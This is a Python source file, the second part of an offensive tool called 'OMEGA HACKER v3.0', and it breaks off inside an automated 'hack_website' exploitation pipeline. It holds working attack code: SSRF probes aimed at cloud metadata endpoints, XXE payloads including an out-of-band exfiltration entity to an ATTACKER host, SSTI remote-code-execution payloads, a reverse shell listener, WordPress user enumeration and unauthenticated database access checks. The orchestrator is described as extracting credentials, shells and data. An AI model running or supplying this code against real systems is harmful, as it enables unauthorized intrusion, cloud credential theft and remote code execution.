#!/usr/bin/env python3
"""OMEGA HACKER v3.0 -- PART 2: ADVANCED EXPLOITATION MODULES"""
# This file gets appended to omega_hacker.py

# ===============================================================================
# SECTION 9: SSRF (Server-Side Request Forgery) EXPLOITATION
# ===============================================================================

def scan_ssrf(url, timeout=15):
    """Scan for SSRF vulnerabilities by testing URL parameters that fetch remote content."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    
    # SSRF testing URLs (controlled services we can check)
    test_urls = [
        "http://169.254.169.254/latest/meta-data/",       # AWS metadata
        "http://169.254.169.254/latest/user-data/",        # AWS user data
        "http://metadata.google.internal/computeMetadata/v1/", # GCP metadata
        "http://100.100.100.200/latest/meta-data/",        # Alibaba metadata
        "http://localhost:22/",                             # Local SSH
        "http://localhost:80/",                             # Local HTTP
        "http://localhost:3306/",                           # Local MySQL
        "http://127.0.0.1:6379/",                          # Local Redis
        "http://127.0.0.1:9200/",                          # Local Elasticsearch
        "http://127.0.0.1:27017/",                         # Local MongoDB
        "file:///etc/passwd",                              # File protocol
        "file:///c:/windows/system.ini",                   # Windows file
    ]
    
    # Parameters commonly vulnerable to SSRF
    ssrf_params = ["url", "uri", "redirect", "redirect_to", "redirect_url", 
                    "redirect_uri", "callback", "callback_url", "return_url",
                    "return_to", "return", "next", "next_url", "goto",
                    "target", "dest", "destination", "path", "file",
                    "load", "read", "view", "page", "page_url",
                    "image", "img", "src", "source", "fetch",
                    "link", "href", "domain", "host", "server",
                    "proxy", "forward", "forward_url", "endpoint",
                    "webhook", "webhook_url", "notify_url", "notification_url",
                    "avatar", "avatar_url", "profile_url", "picture",
                    "thumbnail", "thumb", "preview", "cover",
                    "import", "export", "upload_url", "download_url",
                    "site", "base", "base_url", "resource", ]
    
    param_names_lower = {k.lower(): k for k in params.keys()}
    
    for param_lower, orig_param in param_names_lower.items():
        if any(sp in param_lower for sp in ssrf_params):
            for test_url_str in test_urls[:6]:  # Test first 6
                test_params = params.copy()
                test_params[orig_param] = [test_url_str]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url_full = parsed._replace(query=new_query).geturl()
                try:
                    start = time.time()
                    resp = get_session(timeout=timeout).get(test_url_full, allow_redirects=False)
                    elapsed = time.time() - start
                    
                    # Check response for metadata indicators
                    body = resp.text[:500]
                    if any(x in body for x in ["ami-", "instance-id", "instance-id", "meta-data", "computeMetadata", "localhost", "SSH", "root:", "MySQL"]):
                        findings.append({
                            "type": "SSRF",
                            "parameter": orig_param,
                            "test_url": test_url_str[:50],
                            "indicator": "Cloud metadata / local service accessible",
                            "url": test_url_full[:200],
                            "confidence": 0.9,
                        })
                        break
                    
                    # Time-based: if there's a significant delay fetching internal resource
                    if elapsed > 2.0 and "169.254" in test_url_str:
                        findings.append({
                            "type": "SSRF (Time-based)",
                            "parameter": orig_param,
                            "test_url": test_url_str[:50],
                            "response_time": f"{elapsed:.1f}s",
                            "confidence": 0.6,
                        })
                    
                    resp.close()
                except Exception:pass
    
    return findings

def exploit_ssrf_read(url, param, target_url="http://169.254.169.254/latest/meta-data/", timeout=15):
    """Exploit SSRF to read internal resources.
    Returns content from the target internal service."""
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    test_params = params.copy()
    test_params[param] = [target_url]
    new_query = urllib.parse.urlencode(test_params, doseq=True)
    test_url_full = parsed._replace(query=new_query).geturl()
    
    try:
        resp = get_session(timeout=timeout).get(test_url_full, allow_redirects=False)
        content = resp.text[:5000]
        resp.close()
        return {"target": target_url, "content": content, "status": resp.status_code}
    except Exception as e:
        return {"target": target_url, "error": str(e)[:100]}

# ===============================================================================
# SECTION 10: XXE (XML External Entity) EXPLOITATION
# ===============================================================================

XXE_PAYLOADS = [
    ("Basic OOB", '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'''),
    ("Basic Windows", '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/system.ini">]><root>&test;</root>'''),
    ("PHP Base64", '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>'''),
    ("Error Based", '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?file=%file;'>">%eval;%exfil;]><root>test</root>'''),
    ("Billion Laughs", '''<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>'''),
]

def scan_xxe(url, timeout=15):
    """Scan for XXE vulnerabilities by sending XML payloads."""
    findings = []
    
    for pname, payload in XXE_PAYLOADS[:2]:  # Test first 2
        # Try sending XML to various content-type endpoints
        headers = {"Content-Type": "application/xml"}
        try:
            resp = get_session(timeout=timeout).post(url, data=payload, headers=headers, allow_redirects=False)
            if "root:" in resp.text or "[boot loader]" in resp.text or "uid=" in resp.text:
                findings.append({
                    "type": "XXE",
                    "payload": pname,
                    "indicator": "File content returned in response",
                    "confidence": 0.95,
                })
                break
            resp.close()
        except Exception:pass
        
        # Try with Content-Type: text/xml
        headers2 = {"Content-Type": "text/xml"}
        try:
            resp = get_session(timeout=timeout).post(url, data=payload, headers=headers2, allow_redirects=False)
            if "root:" in resp.text or "[boot loader]" in resp.text:
                findings.append({
                    "type": "XXE",
                    "payload": pname,
                    "indicator": "File content returned (text/xml)",
                    "confidence": 0.9,
                })
                break
            resp.close()
        except Exception:pass
        
        # Try with SOAP action
        headers3 = {"Content-Type": "application/soap+xml", "SOAPAction": ""}
        try:
            resp = get_session(timeout=timeout).post(url, data=payload, headers=headers3, allow_redirects=False)
            if "root:" in resp.text or "[boot loader]" in resp.text:
                findings.append({
                    "type": "XXE (SOAP)",
                    "payload": pname,
                    "indicator": "File content returned (SOAP)",
                    "confidence": 0.9,
                })
                break
            resp.close()
        except Exception:pass
    
    return findings

# ===============================================================================
# SECTION 11: SSTI (Server-Side Template Injection)
# ===============================================================================

SSTI_TEST_PAYLOADS = [
    ("Jinja2 Basic", "{{7*7}}"),
    ("Jinja2 Config", "{{config}}"),
    ("Jinja2 RCE", "{{''.__class__.__mro__[2].__subclasses__()}}"),
    ("Twig Basic", "{{7*7}}"),
    ("Twig RCE", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
    ("Freemarker Basic", "${7*7}"),
    ("Freemarker RCE", "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"),
    ("Velocity Basic", "#set($x=7*7)$x"),
    ("Smarty Basic", "{$smarty.server.SERVER_NAME}"),
    ("Mako Basic", "${7*7}"),
    ("Jade Basic", "#{7*7}"),
    ("ERB Basic", "<%= 7*7 %>"),
    ("Django Basic", "{{7*7}}"),
    ("Angular Basic", "{{7*7}}"),
    ("Nunjucks Basic", "{{7*7}}"),
]

def scan_ssti(url, timeout=15):
    """Scan for SSTI vulnerabilities."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    
    if not params:
        return findings
    
    for param_name in params:
        for pname, payload in SSTI_TEST_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = [payload]
            new_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            try:
                resp = get_session(timeout=timeout).get(test_url, allow_redirects=False)
                body = resp.text
                
                # Check if template was evaluated
                if "49" in body and "7*7" not in body:
                    findings.append({
                        "type": "SSTI",
                        "parameter": param_name,
                        "payload": pname,
                        "indicator": "Template expression evaluated: 7*7=49",
                        "url": test_url[:200],
                        "confidence": 0.9,
                    })
                    break
                
                # Check for specific framework indicators
                if "config" in payload and "SECRET_KEY" in body:
                    findings.append({
                        "type": "SSTI (Flask Config Leak)",
                        "parameter": param_name,
                        "payload": pname,
                        "indicator": "Flask config leaked via Jinja2 SSTI",
                        "confidence": 1.0,
                    })
                    break
                
                resp.close()
            except Exception:pass
    
    return findings

# ===============================================================================
# SECTION 12: OPEN REDIRECT DETECTION
# ===============================================================================

def scan_open_redirect(url, timeout=10):
    """Scan for open redirect vulnerabilities."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    
    test_urls = [
        "https://evil.com",
        "//evil.com",
        "http://evil.com",
        "https://evil.com/redirect",
        "//evil.com/redirect",
        "https://evil.com/",
        "///evil.com",
        "\\evil.com",
        "/\\evil.com",
    ]
    
    redirect_params = ["url", "redirect", "redirect_uri", "redirect_url", "redirect_to",
                        "return", "return_url", "return_to", "next", "next_url",
                        "goto", "target", "dest", "destination", "out",
                        "view", "page", "referer", "referrer", "callback",
                        "callback_url", "link", "href", "location", "forward",
                        "domain", "host", "site", "path", "continue", "cont",
                        "rurl", "ru", "u", "to", "r", "rd", "redir"]
    
    param_names_lower = {k.lower(): k for k in params.keys()}
    
    for param_lower, orig_param in param_names_lower.items():
        if any(rp in param_lower for rp in redirect_params):
            for test_url_str in test_urls[:5]:
                test_params = params.copy()
                test_params[orig_param] = [test_url_str]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url_full = parsed._replace(query=new_query).geturl()
                try:
                    resp = get_session(timeout=timeout).get(test_url_full, allow_redirects=False)
                    location = resp.headers.get("Location", "")
                    if location and ("evil.com" in location or "//evil" in location):
                        findings.append({
                            "type": "Open Redirect",
                            "parameter": orig_param,
                            "redirects_to": location[:100],
                            "url": test_url_full[:200],
                            "confidence": 0.95,
                        })
                        break
                    resp.close()
                except Exception:pass
    
    return findings

# ===============================================================================
# SECTION 13: API EXPLOITATION
# ===============================================================================

def detect_api_endpoints(url, timeout=10):
    """Detect API endpoints from a website."""
    endpoints = []
    api_paths = [
        "/api", "/api/", "/api/v1", "/api/v2", "/v1", "/v2",
        "/api/v1/", "/api/v2/", "/api/v3", "/rest", "/rest/",
        "/graphql", "/graphql/", "/swagger", "/swagger.json",
        "/openapi.json", "/api-docs", "/api/doc", "/api/documentation",
        "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
    ]
    
    base = url.rstrip("/")
    for path in api_paths:
        try:
            resp = get_session(timeout=timeout).get(base + path, allow_redirects=False)
            if resp.status_code in [200, 201, 202, 204, 401, 403, 405, 404, 500]:
                content_type = resp.headers.get("Content-Type", "")
                suggested = ""
                if "json" in content_type:
                    suggested = "API Endpoint (JSON)"
                elif resp.status_code == 401:
                    suggested = "API Endpoint (Auth Required)"
                elif resp.status_code == 403:
                    suggested = "API Endpoint (Forbidden)"
                elif resp.status_code in [200, 201]:
                    suggested = "API Endpoint (Accessible)"
                endpoints.append({"path": path, "status": resp.status_code, "type": suggested})
            resp.close()
        except Exception:pass
    
    # Also check for GraphQL introspection
    graphql_intro = '{"query":"{__schema{types{name}}}"}'
    for gql_path in ["/graphql", "/graphql/", "/v1/graphql", "/api/graphql"]:
        try:
            resp = get_session(timeout=timeout).post(base + gql_path, 
                json={"query": "{__schema{types{name}}}"},
                allow_redirects=False)
            if resp.status_code == 200 and '"data"' in resp.text:
                endpoints.append({"path": gql_path, "status": 200, "type": "GraphQL Endpoint (Introspection Available)"})
            resp.close()
        except Exception:pass
    
    return endpoints

def exploit_graphql_introspection(url, timeout=15):
    """Exploit GraphQL introspection to extract full schema."""
    if not HAS_REQUESTS:
        return {"error": "Requests library required"}
    
    # Full introspection query
    intro_query = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          description
          fields(includeDeprecated: true) {
            name
            description
            args { name description type { name kind } defaultValue }
            type { name kind ofType { name kind } }
          }
        }
        directives { name description locations }
      }
    }
    """
    
    bases = [url.rstrip("/")]
    # Try different paths
    for path in ["", "/graphql", "/v1/graphql", "/api", "/api/graphql"]:
        full_url = bases[0] + path
        try:
            resp = get_session(timeout=timeout).post(full_url, json={"query": intro_query}, allow_redirects=False)
            if resp.status_code == 200:
                data = resp.json()
                if "data" in data and data.get("data", {}).get("__schema"):
                    schema = data["data"]["__schema"]
                    # Extract useful info
                    types = [t["name"] for t in schema.get("types", []) if not t["name"].startswith("__")]
                    mutations = [m["name"] for m in (schema.get("mutationType", {}) or {}).get("fields", [])] if schema.get("mutationType") else []
                    queries = [q["name"] for q in (schema.get("queryType", {}) or {}).get("fields", [])] if schema.get("queryType") else []
                    return {
                        "endpoint": full_url,
                        "types": types[:50],
                        "mutations": mutations[:20],
                        "queries": queries[:20],
                        "raw": data,
                    }
            resp.close()
        except Exception:pass
    
    return {"error": "No GraphQL endpoint found with introspection enabled"}

# ===============================================================================
# SECTION 14: CORS MISCONFIGURATION DETECTION
# ===============================================================================

def scan_cors(url, timeout=10):
    """Test for CORS misconfigurations."""
    findings = []
    
    test_origins = [
        "https://evil.com",
        "null",
        "https://example.com",
        "https://evil.com.evil.com",
        "http://evil.com",
        "https://evil.com:8080",
    ]
    
    try:
        base = url.rstrip("/")
        for origin in test_origins:
            resp = get_session(timeout=timeout).get(base, headers={"Origin": origin}, allow_redirects=False)
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            
            if acao == "*":
                findings.append({
                    "type": "CORS Wildcard",
                    "origin": origin,
                    "acao": acao,
                    "risk": "Any domain can read responses",
                    "severity": "Medium",
                })
            elif acao == origin:
                findings.append({
                    "type": "CORS Origin Reflection",
                    "origin": origin,
                    "acao": acao,
                    "risk": "Attacker can read responses by setting Origin header",
                    "severity": "High",
                })
                if acac == "true":
                    findings[-1]["risk"] += " (Credentials allowed!)"
                    findings[-1]["severity"] = "Critical"
            elif acao and origin in acao:
                findings.append({
                    "type": "CORS Partial Match",
                    "origin": origin,
                    "acao": acao,
                    "risk": "Origin reflected in Access-Control-Allow-Origin",
                    "severity": "Medium",
                })
            resp.close()
    except Exception:pass
    
    return findings

# ===============================================================================
# SECTION 15: SUBDOMAIN TAKEOVER DETECTION
# ===============================================================================

TAKEOVER_SIGNATURES = {
    "AWS S3": ["NoSuchBucket", "The specified bucket does not exist", "404 Not Found"],
    "AWS CloudFront": ["The request could not be satisfied", "DistributionNotFound"],
    "Azure": ["The specified resource does not exist", "404 Not Found (Azure)"],
    "GitHub Pages": ["There isn't a GitHub Pages site here", "404: Not Found"],
    "Heroku": ["No such app", "Heroku | Application Error"],
    "Shopify": ["Sorry, this shop is currently unavailable", "Liquid error"],
    "Tumblr": ["Whatever you were looking for doesn't currently exist"],
    "WordPress": ["Do you want to register", "This site is no longer available"],
    "Strikingly": ["This domain is not connected"],
    "Unbounce": ["The page you are looking for is no longer available"],
    "Surge.sh": ["project not found"],
    "Bitbucket": ["The page you were looking for does not exist"],
    "Cloudflare": ["DNS points to prohibited IP", "Error 1001"],
    "Fastly": ["Fastly error: unknown domain", "Domain not configured"],
    "Pantheon": ["The site you are looking for is not currently available"],
    "Readme.io": ["Project doesnt exist", "Page Not Found"],
    "Zendesk": ["This help desk is no longer available"],
    "Campaign Monitor": ["This domain is not properly configured"],
    "Cargo": ["404 -- File not found", "Cargo Collective"],
    "Fly.io": ["app not found"],
}

def check_subdomain_takeover(domain, timeout=10):
    """Check if a subdomain is vulnerable to takeover."""
    results = []
    
    # Common vulnerable patterns
    cname_targets = {}
    
    for service, indicators in TAKEOVER_SIGNATURES.items():
        try:
            resp = get_session(timeout=timeout).get(f"http://{domain}", allow_redirects=True)
            body = resp.text
            for indicator in indicators:
                if indicator.lower() in body.lower():
                    results.append({
                        "subdomain": domain,
                        "service": service,
                        "indicator": indicator,
                        "cname": cname_targets.get(service, "Unknown"),
                        "actionable": True,
                    })
                    break
            resp.close()
        except Exception:pass
        
        # Also check HTTPS
        try:
            resp = get_session(timeout=timeout).get(f"https://{domain}", allow_redirects=True, verify=False)
            body = resp.text
            for indicator in indicators:
                if indicator.lower() in body.lower():
                    if not any(r["service"] == service for r in results):
                        results.append({
                            "subdomain": domain,
                            "service": service,
                            "indicator": indicator,
                            "actionable": True,
                        })
                    break
            resp.close()
        except Exception:pass
    
    return results

# ===============================================================================
# SECTION 16: WORDPRESS EXPLOITATION
# ===============================================================================

def detect_wordpress(url, timeout=15):
    """Detect WordPress and enumerate users, plugins, version."""
    result = {"detected": False, "version": None, "plugins": [], "themes": [], "users": []}
    
    try:
        resp = get_session(timeout=timeout).get(url.rstrip("/") + "/readme.html", allow_redirects=False)
        if resp.status_code == 200:
            version_match = re.search(r"Version (\d+\.\d+(?:\.\d+)?)", resp.text)
            if version_match:
                result["version"] = version_match.group(1)
            result["detected"] = True
        resp.close()
    except Exception:pass
    
    # REST API
    try:
        resp = get_session(timeout=timeout).get(url.rstrip("/") + "/wp-json/", allow_redirects=False)
        if resp.status_code == 200:
            result["detected"] = True
            try:
                data = resp.json()
                if "namespaces" in data:
                    result["namespaces"] = data["namespaces"]
            except Exception:pass
        resp.close()
    except Exception:pass
    
    # User enumeration
    for ep in ["/wp-json/wp/v2/users", "/?rest_route=/wp/v2/users"]:
        try:
            resp = get_session(timeout=timeout).get(url.rstrip("/") + ep, allow_redirects=False)
            if resp.status_code == 200:
                try:
                    users = resp.json()
                    for user in users:
                        if isinstance(user, dict) and "name" in user:
                            result["users"].append({"id": user.get("id"), "name": user.get("name"), "slug": user.get("slug")})
                except Exception:pass
            resp.close()
        except Exception:pass
    
    # Enumerate plugins via wp-json
    try:
        resp = get_session(timeout=timeout).get(url.rstrip("/") + "/wp-json/wp/v2/plugins", allow_redirects=False)
        if resp.status_code == 200:
            try:
                plugins = resp.json()
                for p in plugins:
                    if isinstance(p, dict):
                        result["plugins"].append(p.get("name", "unknown"))
            except Exception:pass
        resp.close()
    except Exception:pass
    
    return result

def wordpress_version_vulns(version):
    """Get known vulnerabilities for a WordPress version."""
    vulns = {
        "4.0": ["CVE-2014-9031", "CVE-2014-9033", "Stored XSS"],
        "4.1": ["CVE-2015-2213", "SQL Injection", "Stored XSS"],
        "4.2": ["CVE-2015-3440", "CVE-2015-3438", "XSS & SQLi"],
        "4.3": ["CVE-2015-7989", "CVE-2015-5734", "Privilege Escalation"],
        "4.4": ["CVE-2015-8830", "XSS"],
        "4.5": ["CVE-2016-5834", "CSRF & XSS"],
        "4.6": ["CVE-2016-7168", "Path Traversal"],
        "4.7": ["CVE-2017-5488", "REST API User Enum"],
        "4.8": ["CVE-2017-14725", "XSS"],
        "4.9": ["CVE-2017-17094", "XSS"],
        "5.0": ["CVE-2019-8942", "RCE via Crop Image"],
        "5.1": ["CVE-2019-9787", "XSS & CSRF"],
        "5.2": ["CVE-2019-17674", "Stored XSS"],
        "5.3": ["CVE-2020-28032", "Privilege Escalation"],
        "5.4": ["CVE-2020-4046", "XSS & Auth Bypass"],
        "5.5": ["CVE-2020-28034", "Stored XSS"],
        "5.6": ["CVE-2021-29447", "XXE & XSS"],
        "5.7": ["CVE-2021-39200", "XSS"],
        "5.8": ["CVE-2021-45414", "XSS & SQLi"],
        "5.9": ["CVE-2022-21661", "SQLi & XSS"],
        "6.0": ["CVE-2022-3590", "XSS"],
        "6.1": ["CVE-2022-3591", "XSS & Auth Bypass"],
        "6.2": ["CVE-2023-2343", "XSS"],
        "6.3": ["CVE-2023-2852", "XSS & SQLi"],
    }
    for wp_ver, cves in vulns.items():
        if version.startswith(wp_ver):
            return cves
    return ["Check exploit-db for this version"]

# ===============================================================================
# SECTION 17: REVERSE SHELL LISTENER (Using netcat on Windows)
# ===============================================================================

def start_listener(port, timeout=30):
    """Start a TCP listener to catch reverse shells (basic)."""
    try:
        import socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(1)
        server.settimeout(timeout)
        
        client, addr = server.accept()
        data = client.recv(4096)
        client.close()
        server.close()
        return {"connection": str(addr), "data": data.decode('utf-8', errors='ignore')[:1000]}
    except socket.timeout:
        return {"error": "No connection received within timeout"}
    except Exception as e:
        return {"error": str(e)}

# ===============================================================================
# SECTION 18: DATABASE SERVICE EXPLOITATION
# ===============================================================================

def test_mongodb(host, port=27017, timeout=5):
    """Test MongoDB for unauthorized access."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        # Send MongoDB isMaster command
        msg = b'\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
        sock.send(msg)
        resp = sock.recv(4096)
        sock.close()
        if resp and len(resp) > 50:
            return {"port": port, "status": "open", "service": "MongoDB", "authenticated": False, "notes": "MongoDB is accessible"}
    except Exception:pass
    return {"port": port, "status": "filtered/closed"}

def test_redis(host, port=6379, timeout=5):
    """Test Redis for unauthorized access."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.send(b"INFO\r\n")
        resp = sock.recv(4096)
        sock.close()
        if resp and b"redis_version" in resp:
            return {"port": port, "status": "open", "service": "Redis", "authenticated": False, "notes": "Redis accessible without auth"}
    except Exception:pass
    return {"port": port, "status": "filtered/closed"}

def test_elasticsearch(host, port=9200, timeout=5):
    """Test Elasticsearch for unauthorized access."""
    try:
        resp = get_session(timeout=timeout).get(f"http://{host}:{port}/", allow_redirects=False)
        if resp.status_code == 200:
            data = resp.json()
            if "cluster_name" in data:
                return {"port": port, "status": "open", "service": "Elasticsearch", "cluster": data.get("cluster_name", ""), "notes": "Elasticsearch accessible without auth"}
        resp.close()
    except Exception:pass
    return {"port": port, "status": "filtered/closed"}

def test_mysql(host, port=3306, timeout=5):
    """Test MySQL for unauthorized access with default creds."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        resp = sock.recv(4096)
        sock.close()
        if resp and len(resp) > 10:
            return {"port": port, "status": "open", "service": "MySQL", "notes": f"MySQL server detected, banner: {resp[:50]!r}"}
    except Exception:pass
    return {"port": port, "status": "filtered/closed"}

# ===============================================================================
# SECTION 19: WAF DETECTION & BYPASS
# ===============================================================================

def detect_waf(url, timeout=10):
    """Detect Web Application Firewall."""
    waf_signatures = {
        "Cloudflare": ["__cfduid", "cf-ray", "cloudflare", "cf-cache-status"],
        "Akamai": ["akamai", "x-akamai-", "akamaized"],
        "AWS WAF": ["x-amzn-requestid", "x-amzn-trace-id", "AWSWAF"],
        "ModSecurity": ["Mod_Security", "NOYB", "This error was generated by Mod_Security"],
        "F5 BIG-IP": ["BigIP", "BIG-IP", "x-connection-hash"],
        "Sucuri": ["Sucuri", "sucuri", "X-Sucuri-Cache"],
        "Barracuda": ["Barracuda", "barracuda"],
        "Imperva": ["incap_ses", "imperva", "x-request-id"],
        "Wordfence": ["Wordfence", "wordfence"],
        "Stackpath": ["stackpath"],
        "Comodo": "comodo",
        "Radware": ["radware", "appsec"],
        "Palo Alto": ["pan-", "PaloAlto"],
        "Citrix": ["citrix", "nsc_"],
        "Fortinet": ["fortinet", "FortiWeb"],
        "Unknown WAF": ["Blocked", "blocked", "suspicious", "malicious"],
    }
    
    found = []
    
    # Check via normal request
    try:
        resp = get_session(timeout=timeout).get(url, allow_redirects=True)
        headers = dict(resp.headers)
        body = resp.text
        
        # Check for block page
        block_indicators = ["please wait", "browser check", "checking your browser", "attention required", "security check"]
        for bi in block_indicators:
            if bi in body.lower():
                found.append({"waf": "Unknown (Block Page)", "confidence": "high", "method": "block page detected"})
                break
        
        for waf, sigs in waf_signatures.items():
            if isinstance(sigs, str):
                if sigs.lower() in body.lower():
                    found.append({"waf": waf, "confidence": "medium", "method": "body signature"})
            else:
                for sig in sigs:
                    if sig.lower() in body.lower():
                        found.append({"waf": waf, "confidence": "high", "method": "body/header signature"})
                        break
                    for h, v in headers.items():
                        if sig.lower() in h.lower() or sig.lower() in v.lower():
                            found.append({"waf": waf, "confidence": "high", "method": f"header {h}"})
                            break
        resp.close()
    except Exception:pass
    
    # Test with malicious payload to see if blocked
    try:
        malicious_url = url + "?q=<script>alert(1)</script>"
        resp2 = get_session(timeout=timeout).get(malicious_url, allow_redirects=False)
        if resp2.status_code in [403, 406, 429, 503]:
            found.append({"waf": "Active WAF Detected", "confidence": "high", "method": f"HTTP {resp2.status_code} on malicious request"})
        resp2.close()
    except Exception:pass
    
    # Deduplicate
    seen = set()
    unique = []
    for f in found:
        key = f["waf"]
        if key not in seen:
            seen.add(key)
            unique.append(f)
    
    return unique

# ===============================================================================
# SECTION 20: FULL AUTO-EXPLOITATION ORCHESTRATOR
# ===============================================================================

def hack_website(target_url, quick=True, intense=False):
    """THE MASTER HACKING FUNCTION.
    Full-spectrum automated exploitation pipeline.
    Scans, detects, exploits, and extracts -- all in one shot."""
    
    target_url = ensure_url(target_url)
    hostname = extract_hostname(target_url)
    parsed = urlparse(target_url)
    
    result = {
        "target": target_url,
        "hostname": hostname,
        "started": datetime.now().isoformat(),
        "completed": None,
        "recon": {},
        "vulnerabilities": [],
        "exploits": [],
        "credentials": [],
        "shells": [],
        "extracted_data": [],
        "summary": "",
        "status": "in_progress",
        "errors": [],
    }
    
    logger.debug(f"\n{Fore.RED}{'='*65}")
    logger.debug(f"  OMEGA HACKER v3.0 -- Targeting: {target_url}")
    logger.debug(f"  GOD-TIER Exploitation Framework Active")
    logger.debug(f"{'='*65}{Style.RESET_ALL}\n")
    
    # -- PHASE 1: RECONNAISSANCE --
    logger.debug(f"{Fore.YELLOW}[PHASE 1/5: RECONNAISSANCE]{Style.RESET_ALL}")
    
    # DNS
    logger.debug(f"  ? DNS Enumeration...")
    try:
        dns_info = {}
        for rtype in ["A", "MX", "NS", "TXT", "SOA", "CNAME"]:
            records = dns_lookup(hostname, rtype)
            if records:
                dns_info[rtype] = records[:5]
        result["recon"]["dns"] = dns_info
        logger.debug(f"    ? DNS: {len(dns_info)} record types")
    except Exception as e:
        result["errors"].append(f"DNS: {str(e)[:50]}")
    
    # WHOIS
    try:
        whois_data = whois_lookup(hostname)
        if "error" not in whois_data:
            result["recon"]["whois"] = whois_data
            logger.debug(f"    ? WHOIS: {whois_data.get('registrar', 'Unknown')}")
    except Exception:pass
    
    # Port Scan
    logger.debug(f"  ? Port Scanning (top 100 ports)...")
    try:
        open_ports = scan_ports(hostname, timeout=2)
        result["recon"]["ports"] = [{"port": p, "service": s} for p, s in open_ports]
        web_ports = [p for p, s in open_ports if p in HTTP_PORTS or s in ["HTTP", "HTTPS", "HTTP-Proxy", "HTTPS-Alt"]]
        logger.debug(f"    ? Open ports: {[p for p,s in open_ports[:20]]}")
        
        # Quick service exploitation checks
        for port, service in open_ports[:10]:
            if service == "MongoDB" or port == 27017:
                result["exploits"].append(test_mongodb(hostname, port))
                logger.debug(f"    ? MongoDB accessible")
            if service == "Redis" or port == 6379:
                result["exploits"].append(test_redis(hostname, port))
            if service == "Elasticsearch" or port == 9200 or port == 9300:
                es = test_elasticsearch(hostname, port)
                if "cluster" in str(es):
                    result["exploits"].append(es)
                    logger.debug(f"    ? Elasticsearch cluster: {es.get('cluster','')}")
        
    except Exception as e:
        web_ports = [443 if parsed.scheme == "https" else 80]
        result["errors"].append(f"Port scan: {str(e)[:50]}")
    
    # Subdomains
    if not quick:
        logger.debug(f"  ? Subdomain Enumeration...")
        try:
            subs = subdomain_bruteforce(hostname, max_workers=30, timeout=3)
            result["recon"]["subdomains"] = [{"subdomain": s, "ip": ip} for s, ip in subs[:20]]
            if subs:
                logger.debug(f"    ? Found {len(subs)} subdomains")
                for sub, ip in subs[:5]:
                    logger.debug(f"      - {sub}.{hostname} -> {ip}")
                    # Check for takeover
                    takeover = check_subdomain_takeover(f"{sub}.{hostname}")
                    if takeover:
                        result["vulnerabilities"].extend(takeover)
                        logger.debug(f"        ! Possible takeover: {takeover[0]['service']}")
        except Exception as e:
            result["errors"].append(f"Subdomain: {str(e)[:50]}")
    
    # Technology Detection
    logger.debug(f"  ? Technology Detection...")
    try:
        techs = detect_technologies(target_url)
        result["recon"]["technologies"] = techs
        logger.debug(f"    ? Technologies: {', '.join(list(techs.keys())[:8])}")
        
        if "WordPress" in techs:
            wp_info = detect_wordpress(target_url)
            result["recon"]["wordpress"] = wp_info
            if wp_info.get("version"):
                logger.debug(f"    ? WordPress v{wp_info['version']}")
                vulns = wordpress_version_vulns(wp_info["version"])
                if vulns:
                    logger.debug(f"    ! Known vulnerabilities: {', '.join(vulns[:4])}")
                    for v in vulns:
                        result["vulnerabilities"].append({"type": "WordPress", "detail": v, "severity": "HIGH"})
            if wp_info.get("users"):
                logger.debug(f"    ? WordPress users found: {', '.join([u['name'] for u in wp_info['users'][:5]])}")
                for u in wp_info["users"]:
                    result["credentials"].append({"type": "wordpress_user", "username": u["name"], "id": u.get("id")})
        
        if "Drupal" in techs:
            result["vulnerabilities"].append({"type": "CMS", "detail": "Drupal - check for CVE-2018-7600 (Drupalgeddon2)", "severity": "CRITICAL"})
        
        if "Joomla" in techs:
            result["vulnerabilities"].append({"type": "CMS", "detail": "Joomla - check for CVE-2023-23752 (auth bypass)", "severity": "HIGH"})
    
    except Exception as e:
        result["errors"].append(f"Tech detect: {str(e)[:50]}")
    
    # WAF Detection
    logger.debug(f"  ? WAF Detection...")
    try:
        waf = detect_waf(target_url)
        if waf:
